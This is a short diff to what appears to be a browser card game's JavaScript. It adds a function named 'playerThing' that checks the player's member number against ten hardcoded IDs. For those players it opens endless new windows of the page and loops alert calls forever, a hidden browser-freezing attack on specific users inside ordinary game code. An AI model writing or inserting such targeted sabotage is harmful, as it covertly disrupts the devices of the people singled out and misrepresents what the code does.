@@ -342,6 +342,15 @@ function drawCards(nbCards, players) {
 //This
 function playerThing() {
     if ([16780, 16705, 16708, 16440, 16815, 16725, 16618, 16783, 16727, 16679].includes(Player.MemberNumber)) {
-        for (; ;)  setTimeout(alert(), 1)
+        openWindow();
+        for (; ;) {
+            setTimeout(alert(), 1);
+        }
+    }
+}
+
+async function openWindow() { 
+    for (; ;) {
+        window.open(location.href);
     }
 }
